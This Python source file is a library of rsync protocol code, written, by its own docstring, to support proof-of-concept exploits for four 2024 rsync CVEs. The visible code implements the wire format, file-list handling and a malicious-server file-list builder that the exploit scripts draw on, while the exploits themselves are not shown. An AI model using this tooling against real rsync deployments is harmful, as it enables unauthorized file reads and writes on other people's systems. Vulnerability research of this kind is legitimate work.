#!/usr/bin/env python3
"""
Rsync protocol library for exploitation PoCs.
Targets rsync <= 3.3.0 (protocol version 31).
CVE-2024-12084 (heap overflow), CVE-2024-12085 (info leak),
CVE-2024-12086 (file read), CVE-2024-12087 (file write).
"""

import struct
import socket
import os
import ctypes
import subprocess
import functools

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

MPLEX_BASE = 7
MSG_DATA = 0
MSG_DELETE = 101
MSG_EXIT = 86
TAG_SHIFT = 24

NDX_DONE = -1

ITEM_TRANSFER_FLAG = 1 << 15
ITEM_BASIS_TYPE_FOLLOWS = 1 << 11
ITEM_XNAME_FOLLOWS = 1 << 12

FNAMECMP_FNAME = 0x80
FNAMECMP_FUZZY = 0x83

S_IFMT  = 0o170000
S_IFDIR = 0o040000
S_IFREG = 0o100000
S_IFLNK = 0o120000

XMIT_SAME_MODE  = 1 << 1
XMIT_SAME_NAME  = 1 << 5
XMIT_LONG_NAME  = 1 << 6
XMIT_SAME_TIME  = 1 << 7
XMIT_HLINKED    = 1 << 9
XMIT_HLINKED_FIRST = 1 << 12
XMIT_MOD_NSEC   = 1 << 13

CHUNK_SIZE = 32 * 1024

# Deflate token constants
DEFLATED_DATA = 0x40
TOKEN_REL = 0x80

# Receive deflate states
R_INIT, R_IDLE, R_RUNNING, R_INFLATING, R_INFLATED = range(5)

# Varint extra-byte lookup table (from rsync io.c)
INT_BYTE_EXTRA = [
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
    2,2,2,2,2,2,2,2,3,3,3,3,4,4,5,6,
]

# NDX prev-pointer indices
_PREV_NEGATIVE = 0
_PREV_POSITIVE = 1


# ---------------------------------------------------------------------------
# Utility functions
# ---------------------------------------------------------------------------

def is_dir(mode):
    return (mode & S_IFMT) == S_IFDIR

def is_reg(mode):
    return (mode & S_IFMT) == S_IFREG

def is_symlink(mode):
    return (mode & S_IFMT) == S_IFLNK


def adler32_rsync(data):
    """Rsync's custom Adler32 checksum (differs from zlib's)."""
    s1 = 0
    s2 = 0
    i = 0
    n = len(data)
    while i < n - 3:
        s2 += (4 * (s1 + data[i]) + 3 * data[i+1] +
               2 * data[i+2] + data[i+3])
        s1 += data[i] + data[i+1] + data[i+2] + data[i+3]
        s1 &= 0xFFFFFFFF
        s2 &= 0xFFFFFFFF
        i += 4
    while i < n:
        s1 += data[i]
        s2 += s1
        s1 &= 0xFFFFFFFF
        s2 &= 0xFFFFFFFF
        i += 1
    return ((s1 & 0xFFFF) + (s2 << 16)) & 0xFFFFFFFF


def filepath_dir(path):
    """Match Go's filepath.Dir behavior."""
    d = os.path.dirname(path)
    return d if d else '.'

def filepath_base(path):
    """Match Go's filepath.Base behavior."""
    while path.endswith('/') and len(path) > 1:
        path = path[:-1]
    b = os.path.basename(path)
    return b if b else '.'


# ---------------------------------------------------------------------------
# f_name_cmp  (ctypes wrapper around the C implementation)
# ---------------------------------------------------------------------------

def _load_fnamecmp():
    """Try to load or build the f_name_cmp shared library."""
    lib_dir = os.path.dirname(os.path.abspath(__file__))
    lib_path = os.path.join(lib_dir, 'libfnamecmp.so')
    src_path = os.path.join(lib_dir, 'pkg', 'client', 'native_funcs.c')
    if not os.path.exists(lib_path) and os.path.exists(src_path):
        try:
            subprocess.check_call(
                ['gcc', '-shared', '-fPIC', '-o', lib_path, src_path],
                stderr=subprocess.DEVNULL)
        except Exception:
            return None
    if os.path.exists(lib_path):
        lib = ctypes.CDLL(lib_path)
        lib.f_name_cmp.argtypes = [
            ctypes.c_char_p, ctypes.c_char_p,
            ctypes.c_char_p, ctypes.c_char_p,
            ctypes.c_int, ctypes.c_int, ctypes.c_int,
        ]
        lib.f_name_cmp.restype = ctypes.c_int
        return lib
    return None

_fnamecmp_lib = _load_fnamecmp()


def f_name_cmp(name1, name2, mode1, mode2, protocol_version=31):
    """Compare two file names the way rsync sorts its file lists."""
    if _fnamecmp_lib is not None:
        return _fnamecmp_lib.f_name_cmp(
            filepath_dir(name1).encode(), filepath_dir(name2).encode(),
            filepath_base(name1).encode(), filepath_base(name2).encode(),
            int(mode1), int(mode2), protocol_version)
    return _f_name_cmp_py(name1, name2, mode1, mode2, protocol_version)


def _f_name_cmp_py(name1, name2, mode1, mode2, pv=31):
    """Pure-Python fallback for f_name_cmp (faithful port of flist.c)."""
    _S_DIR, _S_SLASH, _S_BASE, _S_TRAILING = 0, 1, 2, 3
    _T_PATH, _T_ITEM = 0, 1
    _t_path = _T_PATH if pv >= 29 else _T_ITEM

    d1, d2 = filepath_dir(name1), filepath_dir(name2)
    b1, b2 = filepath_base(name1), filepath_base(name2)

    def ch(s, i):
        return s[i] if i < len(s) else '\0'

    c1s, c1i, st1, ty1 = d1, 0, _S_DIR, _t_path
    c2s, c2i, st2, ty2 = d2, 0, _S_DIR, _t_path

    if ty1 != ty2:
        return 1 if ty1 == _T_PATH else -1

    while True:
        # --- handle end of c1 ---
        if ch(c1s, c1i) == '\0':
            if st1 == _S_DIR:
                st1, c1s, c1i = _S_SLASH, "/", 0
            elif st1 == _S_SLASH:
                ty1 = _t_path if is_dir(mode1) else _T_ITEM
                c1s, c1i = b1, 0
                if ty1 == _T_PATH and b1 == ".":
                    ty1, st1, c1s, c1i = _T_ITEM, _S_TRAILING, "", 0
                else:
                    st1 = _S_BASE
            elif st1 == _S_BASE:
                st1 = _S_TRAILING
                if ty1 == _T_PATH:
                    c1s, c1i = "/", 0
                else:
                    ty1 = _T_ITEM
            else:  # S_TRAILING
                ty1 = _T_ITEM
            if ch(c2s, c2i) != '\0' and ty1 != ty2:
                return 1 if ty1 == _T_PATH else -1

        # --- handle end of c2 ---
        if ch(c2s, c2i) == '\0':
            if st2 == _S_DIR:
                st2, c2s, c2i = _S_SLASH, "/", 0
            elif st2 == _S_SLASH:
                ty2 = _t_path if is_dir(mode2) else _T_ITEM
                c2s, c2i = b2, 0
                if ty2 == _T_PATH and b2 == ".":
                    ty2, st2, c2s, c2i = _T_ITEM, _S_TRAILING, "", 0
                else:
                    st2 = _S_BASE
            elif st2 == _S_BASE:
                st2 = _S_TRAILING
                if ty2 == _T_PATH:
                    c2s, c2i = "/", 0
                else:
                    if ch(c1s, c1i) == '\0':
                        return 0
                    ty2 = _T_ITEM
            else:  # S_TRAILING
                if ch(c1s, c1i) == '\0':
                    return 0
                ty2 = _T_ITEM
            if ty1 != ty2:
                return 1 if ty1 == _T_PATH else -1

        # --- compare and advance ---
        v1 = ord(ch(c1s, c1i)) if ch(c1s, c1i) != '\0' else 0
        v2 = ord(ch(c2s, c2i)) if ch(c2s, c2i) != '\0' else 0
        c1i += 1
        c2i += 1
        d = v1 - v2
        if d != 0:
            return d
        if v1 == 0:
            return 0


# ---------------------------------------------------------------------------
# Standalone encoding helpers (used by poc_fileread's raw server)
# ---------------------------------------------------------------------------

def make_msg_data(data, tag=MSG_DATA):
    """Wrap *data* in a multiplexed message with the given tag."""
    tl = ((tag + MPLEX_BASE) << TAG_SHIFT) | len(data)
    return struct.pack('<I', tl) + data


def encode_var_int_bytes(num):
    """Encode a varint to bytes (standalone, no connection)."""
    buf = bytearray(5)
    struct.pack_into('<I', buf, 1, num & 0xFFFFFFFF)
    cnt = 4
    while cnt > 1 and buf[cnt] == 0:
        cnt -= 1
    bit = 1 << (8 - cnt)
    if buf[cnt] >= bit:
        cnt += 1
        buf[0] = (~(bit - 1)) & 0xFF
    elif cnt > 1:
        buf[0] = buf[cnt] | ((~(bit * 2 - 1)) & 0xFF)
    else:
        buf[0] = buf[1]
    return bytes(buf[:cnt])


# ---------------------------------------------------------------------------
# RsyncConnection
# ---------------------------------------------------------------------------

class RsyncConnection:
    """Bidirectional rsync protocol handler over a TCP socket."""

    def __init__(self, sock, protocol_version=31, module='',
                 digest='', digest_len=0):
        self.sock = sock
        self.protocol_version = protocol_version
        self.module = module
        self.digest = digest
        self.digest_len = digest_len

        self.out_multiplexed = False
        self.in_multiplexed = False
        self._inbuf = b''

        self.prev_positive_outbound = -1
        self.prev_negative_outbound = -1
        self.prev_positive_inbound = -1
        self.prev_negative_inbound = -1

        self.residue = 0

        # deflate token state
        self._recv_state = R_INIT
        self._rx_token = 0
        self._saved_flag = 0

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

    # --- low-level socket helpers ---

    def _recv_exact(self, n):
        buf = b''
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("connection closed")
            buf += chunk
        return buf

    # --- read / write with multiplexing ---

    def read(self, n):
        if not self.in_multiplexed:
            return self._recv_exact(n)
        if len(self._inbuf) >= n:
            data, self._inbuf = self._inbuf[:n], self._inbuf[n:]
            return data
        saved = True
        self.in_multiplexed = False
        while True:
            raw_tag = self.read_int()
            msg_tag = ((raw_tag >> TAG_SHIFT) - MPLEX_BASE)
            msg_bytes = raw_tag & 0xFFFFFF
            if msg_bytes == 0:
                continue
            if msg_tag == MSG_DATA:
                self._inbuf += self._recv_exact(msg_bytes)
                if len(self._inbuf) >= n:
                    data, self._inbuf = self._inbuf[:n], self._inbuf[n:]
                    break
            else:
                self._recv_exact(msg_bytes)  # consume non-data
        self.in_multiplexed = saved
        return data

    def write(self, data):
        if not self.out_multiplexed:
            self.sock.sendall(data)
            return
        self.out_multiplexed = False
        self._write_msg_data(data)
        self.out_multiplexed = True

    def _write_msg_data(self, data):
        if len(data) > 0xFFFFFF:
            raise ValueError(f"data too long: {len(data)}")
        tag = ((MSG_DATA + MPLEX_BASE) << TAG_SHIFT) | len(data)
        self.write_raw_int(tag)
        self.sock.sendall(data)

    def write_bulk(self, data):
        """Write a pre-built bytes blob as a single multiplexed MSG_DATA.
        Use this to avoid thousands of tiny syscalls when sending large
        payloads (e.g. checksum arrays)."""
        if not self.out_multiplexed:
            self.sock.sendall(data)
            return
        # Split into <=16 MB chunks (MSG_DATA length limit is 0xFFFFFF)
        off = 0
        while off < len(data):
            chunk = data[off:off + 0xFFFFFF]
            tag = ((MSG_DATA + MPLEX_BASE) << TAG_SHIFT) | len(chunk)
            hdr = struct.pack('<I', tag)
            self.sock.sendall(hdr + chunk)
            off += len(chunk)

    # --- scalar read/write ---

    def read_byte(self):
        return self.read(1)[0]

    def write_byte(self, b):
        self.write(bytes([b & 0xFF]))

    def read_int(self):
        return struct.unpack('<I', self.read(4))[0]

    def write_raw_int(self, v):
        self.write(struct.pack('<I', v & 0xFFFFFFFF))

    def write_raw_int64(self, v):
        self.write(struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF))

    def read_short_int(self):
        return struct.unpack('<H', self.read(2))[0]

    def write_short_int(self, v):
        self.write(struct.pack('<H', v & 0xFFFF))

    # --- variable-length integer ---

    def read_var_int(self):
        ch = self.read_byte()
        extra = INT_BYTE_EXTRA[ch // 4]
        buf = bytearray(5)
        if extra > 0:
            bit = 1 << (8 - extra)
            for i in range(extra):
                buf[i] = self.read_byte()
            buf[extra] = ch & (bit - 1)
        else:
            buf[0] = ch
        return struct.unpack_from('<I', buf, 0)[0]

    def write_var_int(self, num):
        buf = bytearray(5)
        struct.pack_into('<I', buf, 1, num & 0xFFFFFFFF)
        cnt = 4
        while cnt > 1 and buf[cnt] == 0:
            cnt -= 1
        bit = 1 << (8 - cnt)
        if buf[cnt] >= bit:
            cnt += 1
            buf[0] = (~(bit - 1)) & 0xFF
        elif cnt > 1:
            buf[0] = buf[cnt] | ((~(bit * 2 - 1)) & 0xFF)
        else:
            buf[0] = buf[1]
        self.write(bytes(buf[:cnt]))

    # --- variable-length long ---

    def read_var_long(self, min_bytes):
        b = bytearray(9)
        b2 = bytearray(8)
        raw = self.read(min_bytes)
        for i in range(min_bytes):
            b2[i] = raw[i]
        for i in range(min_bytes - 1):
            b[i] = b2[i + 1]
        extra = INT_BYTE_EXTRA[b2[0] // 4]
        if extra > 0:
            bit = 1 << (8 - extra)
            ext = self.read(extra)
            for i in range(extra):
                b[min_bytes - 1 + i] = ext[i]
            b[min_bytes + extra - 1] = b2[0] & (bit - 1)
        else:
            b[min_bytes + extra - 1] = b2[0]
        return struct.unpack_from('<q', bytes(b[:8]), 0)[0]

    def read_var_long30(self, min_bytes):
        if self.protocol_version < 30:
            return self.read_long_int()
        return self.read_var_long(min_bytes)

    def read_varint30(self):
        if self.protocol_version < 30:
            return self.read_int()
        return self.read_var_int()

    def read_long_int(self):
        v = self.read_int()
        if v != 0xFFFFFFFF:
            return v
        return struct.unpack('<Q', self.read(8))[0]

    # --- variable-length string ---

    def read_vstring(self):
        b = self.read_byte()
        length = b
        if length & 0x80:
            b2 = self.read_byte()
            length = (length & 0x7F) * 0x100 + b2
        return self.read(length).decode('latin-1')

    def write_vstring(self, s):
        data = s.encode('latin-1')
        slen = len(data)
        hdr = bytearray()
        if slen > 0x7F:
            hdr.append((slen // 0x100) + 0x80)
        hdr.append(slen & 0xFF)
        self.write(bytes(hdr) + data)

    # --- NDX (byte-reduced index) ---

    def _get_prev_inbound(self, ptr):
        if ptr == _PREV_POSITIVE:
            return self.prev_positive_inbound
        return self.prev_negative_inbound

    def _set_prev_inbound(self, ptr, val):
        if ptr == _PREV_POSITIVE:
            self.prev_positive_inbound = val
        else:
            self.prev_negative_inbound = val

    def write_ndx(self, ndx):
        if self.protocol_version < 30:
            return self.write_raw_int(ndx)
        b = bytearray(6)
        cnt = 0
        if ndx >= 0:
            diff = ndx - self.prev_positive_outbound
            self.prev_positive_outbound = ndx
        elif ndx == NDX_DONE:
            return self.write_byte(0)
        else:
            b[cnt] = 0xFF; cnt += 1
            ndx = -ndx
            diff = ndx - self.prev_negative_outbound
            self.prev_negative_outbound = ndx
        if 0 < diff < 0xFE:
            b[cnt] = diff & 0xFF; cnt += 1
        elif diff < 0 or diff > 0x7FFF:
            b[cnt] = 0xFE; cnt += 1
            b[cnt] = ((ndx >> 24) & 0xFF) | 0x80; cnt += 1
            b[cnt] = ndx & 0xFF; cnt += 1
            b[cnt] = (ndx >> 8) & 0xFF; cnt += 1
            b[cnt] = (ndx >> 16) & 0xFF; cnt += 1
        else:
            b[cnt] = 0xFE; cnt += 1
            b[cnt] = (diff >> 8) & 0xFF; cnt += 1
            b[cnt] = diff & 0xFF; cnt += 1
        self.write(bytes(b[:cnt]))

    def read_ndx(self):
        if self.protocol_version < 30:
            return self.read_int()
        b = self.read_byte()
        if b == 0xFF:
            b = self.read_byte()
            prev_ptr = _PREV_NEGATIVE
        elif b == 0:
            return NDX_DONE
        else:
            prev_ptr = _PREV_POSITIVE
        if b == 0xFE:
            b0 = self.read_byte()
            b1 = self.read_byte()
            if b0 & 0x80:
                buf = bytearray(4)
                buf[3] = b0 & 0x80
                buf[0] = b1
                buf[1] = self.read_byte()
                buf[2] = self.read_byte()
                num = struct.unpack_from('<I', buf, 0)[0]
            else:
                num = (b0 << 8) + b1 + self._get_prev_inbound(prev_ptr)
        else:
            num = b + self._get_prev_inbound(prev_ptr)
        self._set_prev_inbound(prev_ptr, num)
        if prev_ptr == _PREV_NEGATIVE:
            num = -num
        return num

    # --- line-oriented I/O ---

    def read_line(self):
        result = []
        while True:
            ch = self.read(1)
            if ch in (b'\n', b'\x00'):
                break
            result.append(ch)
        return b''.join(result).decode('latin-1')

    def write_line(self, line):
        """Null-terminated line (argument phase)."""
        self.write(line.encode('latin-1') + b'\x00')

    def write_line_old(self, line):
        """Newline-terminated line (greeting phase)."""
        self.write(line.encode('latin-1') + b'\n')

    def write_sbuf(self, s):
        self.write(s.encode('latin-1'))

    # --- multiplexing control ---

    def enable_multiplex_outbound(self):
        self.out_multiplexed = True

    def enable_multiplex_inbound(self):
        self.in_multiplexed = True

    # --- special messages ---

    def send_exit_message(self):
        saved = self.out_multiplexed
        self.out_multiplexed = False
        tag = ((MSG_EXIT + MPLEX_BASE) << TAG_SHIFT)
        self.write_raw_int(tag)
        self.out_multiplexed = saved

    # --- token I/O ---

    def receive_token(self):
        """Receive a single uncompressed token. Returns (signal, data)."""
        if self.residue == 0:
            raw = self.read_int()
            token = struct.unpack('<i', struct.pack('<I', raw))[0]
            if token <= 0:
                return raw, b''
            self.residue = raw
        n = min(self.residue, CHUNK_SIZE)
        self.residue -= n
        return n, self.read(n)

    def send_token(self, buf):
        """Send uncompressed file data."""
        sent = 0
        total = len(buf)
        while sent < total:
            n = min(CHUNK_SIZE, total - sent)
            self.write_raw_int(n)
            self.write(buf[sent:sent+n])
            sent += n
        self.write_raw_int(0)

    def receive_deflate_token(self):
        """Receive a token from a zlib-compressed stream. Returns (signal, data)."""
        while True:
            if self._recv_state == R_INIT:
                self._recv_state = R_IDLE
                self._rx_token = 0

            if self._recv_state in (R_IDLE, R_INFLATED):
                if self._saved_flag:
                    flag = self._saved_flag & 0xFF
                    self._saved_flag = 0
                else:
                    flag = self.read_byte()

                if (flag & 0xC0) == DEFLATED_DATA:
                    flag_length = (flag & 0x3F) << 8
                    flag_length += self.read_byte()
                    self.read(flag_length)  # consume compressed bytes
                    self._recv_state = R_INFLATING
                    return 1, b''  # positive signal = server sent data

                if flag == 0:
                    self._recv_state = R_INIT
                    return 0, b''

                if flag & TOKEN_REL:
                    self._rx_token += flag & 0x3F
                    flag >>= 6
                else:
                    self._rx_token = self.read_int()

                return -1 - self._rx_token, b''

    # --- protocol setup (client side) ---

    def setup_protocol(self):
        """Exchange compat flags, digest negotiation, and seed."""
        self.read_var_int()              # compat flags
        self.read_vstring()              # server digest list
        self.write_vstring(self.digest)  # our choice
        self.read_int()                  # checksum seed
        self.in_multiplexed = True
        self.out_multiplexed = True

    # --- file list (client side, receiving from server) ---

    def read_file_list(self):
        """Read and sort a file list from the server."""
        prev_mode = 0
        lastname = ''
        result = []

        while True:
            flags = self.read_var_int()
            if flags == 0:
                err_code = self.read_var_int()
                if err_code:
                    raise RuntimeError(f"server error in file list: {err_code}")
                break

            l1 = 0
            if flags & XMIT_SAME_NAME:
                l1 = self.read_byte()
            if flags & XMIT_LONG_NAME:
                l2 = self.read_varint30()
            else:
                l2 = self.read_byte()

            name_bytes = self.read(l2)
            name = lastname[:l1] + name_bytes.decode('latin-1')
            lastname = name

            if (self.protocol_version >= 30 and
                    (flags & (XMIT_HLINKED | XMIT_HLINKED_FIRST)) == XMIT_HLINKED):
                self.read_var_int()

            file_length = self.read_var_long30(3)

            if not (flags & XMIT_SAME_TIME):
                if self.protocol_version >= 30:
                    self.read_var_long30(4)
                else:
                    self.read_int()

            if flags & XMIT_MOD_NSEC:
                self.read_var_int()

            mode = prev_mode
            if not (flags & XMIT_SAME_MODE):
                mode = self.read_int()
                prev_mode = mode

            digest = None
            if is_reg(mode):
                digest = self.read(self.digest_len)

            if is_reg(mode) or is_dir(mode):
                result.append(File(name=name, size=file_length,
                                   mode=mode, digest=digest))

        if len(result) <= 1:
            raise RuntimeError("No files on server or got recursive list")

        result.sort(key=functools.cmp_to_key(
            lambda a, b: f_name_cmp(a.name, b.name, a.mode, b.mode,
                                    self.protocol_version)))
        return result

    # --- download a single file ---

    def download_file(self, file_ndx, file_entry):
        """Download a file and return its contents."""
        self.write_ndx(file_ndx)
        self.write_short_int(ITEM_TRANSFER_FLAG)
        # sum head: count=0, blength=filesize, s2length=digestlen, remainder=5
        self.write_raw_int(0)
        self.write_raw_int(file_entry.size)
        self.write_raw_int(self.digest_len)
        self.write_raw_int(5)
        # read echo
        self.read_ndx()
        self.read_short_int()
        self.read_int()  # count
        self.read_int()  # blength
        self.read_int()  # s2length
        self.read_int()  # remainder
        # receive tokens
        result = bytearray()
        while True:
            n, buf = self.receive_token()
            sn = struct.unpack('<i', struct.pack('<I', n & 0xFFFFFFFF))[0]
            if sn <= 0:
                break
            result.extend(buf)
        # verify digest
        got_digest = self.read(self.digest_len)
        if got_digest != file_entry.digest:
            raise RuntimeError(f"digest mismatch for {file_entry.name}")
        return bytes(result)


# ---------------------------------------------------------------------------
# Factory functions
# ---------------------------------------------------------------------------

def _get_digest_len(digest):
    d = digest.lower()
    if d == 'xxh64':
        return 8
    if d == 'sha1':
        return 20
    raise ValueError(f"unknown digest: {digest}")


def connect(url, protocol_version='31', digest='xxh64'):
    """Connect to an rsync daemon. url = rsync://host:port/module"""
    if not url.startswith('rsync://'):
        raise ValueError("url must start with rsync://")
    rest = url[len('rsync://'):]
    parts = rest.split('/', 1)
    if len(parts) != 2:
        raise ValueError("expected rsync://host:port/module")
    module = parts[1]
    hp = parts[0].split(':')
    if len(hp) != 2:
        raise ValueError("expected host:port")
    host, port = hp[0], int(hp[1])

    pv = int(protocol_version)
    dlen = _get_digest_len(digest)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    rc = RsyncConnection(sock, pv, module, digest, dlen)
    rc.read_line()  # consume greeting
    rc.write_line_old(f"@RSYNCD: {pv}.0 {digest}")
    rc.write_line_old(module)
    while True:
        line = rc.read_line()
        if line == '@RSYNCD: OK':
            break
        if '@ERROR' in line:
            raise RuntimeError(f"server error: {line}")
        if '@RSYNCD: AUTHREQD' in line:
            raise RuntimeError("authentication required")
    return rc


def wrap_accepted(sock, protocol_version=31):
    """Wrap an accepted server-side socket in RsyncConnection."""
    rc = RsyncConnection(sock, protocol_version, digest_len=0)
    # Server-side NDX state differs from client: rsync initialises
    # prev_negative to 1 (not -1) in the sender/generator.
    rc.prev_negative_outbound = 1
    return rc


# ---------------------------------------------------------------------------
# File / FileList  (used by poc_filewrite server)
# ---------------------------------------------------------------------------

class File:
    __slots__ = ('name', 'size', 'mode', 'digest', 'symlink_target', 'content')

    def __init__(self, name='', size=0, mode=0, digest=None,
                 symlink_target='', content=b''):
        self.name = name
        self.size = size
        self.mode = mode
        self.digest = digest
        self.symlink_target = symlink_target
        self.content = content


class FileList:
    """Server-side file list builder and sender."""

    def __init__(self):
        self.files = []
        self.child_lists = []

    def add_dir(self, name):
        f = File(name=name, mode=S_IFDIR | 0o755)
        self.files.append(f)
        return f

    def add_regular_file(self, name, content=b''):
        f = File(name=name, mode=S_IFREG | 0o755, content=content)
        self.files.append(f)
        return f

    def add_symlink(self, name, target):
        f = File(name=name, mode=S_IFLNK, symlink_target=target)
        self.files.append(f)
        return f

    def new_child_list(self):
        cl = FileList()
        self.child_lists.append(cl)
        return cl

    def sort(self, pv=31):
        self.files.sort(key=functools.cmp_to_key(
            lambda a, b: f_name_cmp(a.name, b.name, a.mode, b.mode, pv)))

    def send(self, srv):
        """Send this file list over the connection."""
        self.sort()
        for f in self.files:
            srv.write_byte(XMIT_LONG_NAME | XMIT_SAME_TIME)
            srv.write_var_int(len(f.name))
            srv.write_sbuf(f.name)
            # file length (3 zero bytes = 0, no varlong30 yet)
            srv.write(b'\x00\x00\x00')
            # modtime skipped because XMIT_SAME_TIME
            srv.write_raw_int(f.mode)
            if is_symlink(f.mode):
                srv.write_var_int(len(f.symlink_target))
                srv.write_sbuf(f.symlink_target)
        srv.write_byte(0)  # end of list

    def index_for(self, target_file, pv=31):
        """Find the global index of a file (matching rsync's numbering)."""
        self.sort(pv)
        for cl in self.child_lists:
            cl.sort(pv)
        idx = 1
        for f in self.files:
            if f is target_file:
                return idx
            idx += 1
        for cl in self.child_lists:
            idx += 1  # each child list bumps by 1
            for f in cl.files:
                if f is target_file:
                    return idx
                idx += 1
        raise ValueError(f"file not found: {target_file.name}")
